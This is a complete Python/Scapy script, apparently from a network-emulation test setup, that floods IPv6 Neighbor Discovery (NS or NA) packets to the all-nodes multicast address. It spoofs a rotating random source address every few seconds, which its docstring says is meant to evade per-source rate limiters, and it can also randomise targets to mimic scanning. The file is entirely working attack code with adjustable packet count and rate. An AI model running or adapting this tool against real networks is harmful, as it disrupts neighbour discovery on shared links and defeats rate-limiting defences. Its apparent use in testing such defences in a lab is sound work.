#!/usr/bin/env python3
"""
attacks/ndp_flood.py - Rotating-Source NDP (NS/NA) Flood Attack Tool

Generates Neighbor Discovery flood traffic while continuously rotating its
source IPv6 address every few seconds to evade naive per-source-IP rate limiters.
"""

import sys
import time
import random
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import send, IPv6, ICMPv6ND_NS, ICMPv6ND_NA

def random_ipv6_addr(prefix: str = "fd00:abcd::") -> str:
    rand_suffix = f"{random.randint(1, 0xffff):04x}:{random.randint(1, 0xffff):04x}"
    return f"{prefix}{rand_suffix}"

def launch_ndp_flood(
    iface: str = "h3-eth0",
    ndp_type: str = "NS",
    total_packets: int = 50,
    rate_pps: float = 10.0,
    rotate_seconds: float = 2.0,
    target_scan: bool = False
):
    print(f"[*] Starting {ndp_type} Flood Attack on {iface}...")
    print(f"[*] Total packets: {total_packets}, Rate: {rate_pps} pps, IP rotation: every {rotate_seconds}s")

    delay = 1.0 / rate_pps if rate_pps > 0 else 0.1
    current_src = random_ipv6_addr()
    last_rotate_time = time.time()
    rotations_done = 0

    default_target = "fd00:abcd::1"

    for i in range(total_packets):
        now = time.time()
        # Rotate source IP if window elapsed
        if now - last_rotate_time >= rotate_seconds:
            current_src = random_ipv6_addr()
            last_rotate_time = now
            rotations_done += 1
            print(f"[!] Rotated attacker source IP -> {current_src} (Rotation #{rotations_done})")

        tgt = random_ipv6_addr() if target_scan else default_target

        if ndp_type.upper() == "NS":
            # Neighbor Solicitation packet
            pkt = IPv6(src=current_src, dst="ff02::1", hlim=255) / \
                  ICMPv6ND_NS(tgt=tgt)
        else:
            # Neighbor Advertisement packet
            pkt = IPv6(src=current_src, dst="ff02::1", hlim=255) / \
                  ICMPv6ND_NA(tgt=tgt, R=0, S=0, O=1)

        send(pkt, iface=iface, verbose=False)

        if (i + 1) % 10 == 0:
            print(f"  -> Injected {i+1}/{total_packets} {ndp_type} packets from {current_src}...")

        time.sleep(delay)

    print(f"[+] NDP {ndp_type} flood complete. Total sent: {total_packets}, Rotations: {rotations_done}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PS-007 Rotating-Source NDP Flood Tool")
    parser.add_argument("-i", "--iface", default="h3-eth0", help="Network interface")
    parser.add_argument("-t", "--type", choices=["NS", "NA"], default="NS", help="NDP message type to flood")
    parser.add_argument("-n", "--count", type=int, default=40, help="Total packets to send")
    parser.add_argument("-r", "--rate", type=float, default=8.0, help="Transmission rate (packets/sec)")
    parser.add_argument("--rotate-sec", type=float, default=2.0, help="Source IP rotation interval (seconds)")
    parser.add_argument("--scan", action="store_true", help="Randomize target IP to simulate scanning")
    args = parser.parse_args()

    launch_ndp_flood(
        iface=args.iface,
        ndp_type=args.type,
        total_packets=args.count,
        rate_pps=args.rate,
        rotate_seconds=args.rotate_sec,
        target_scan=args.scan
    )
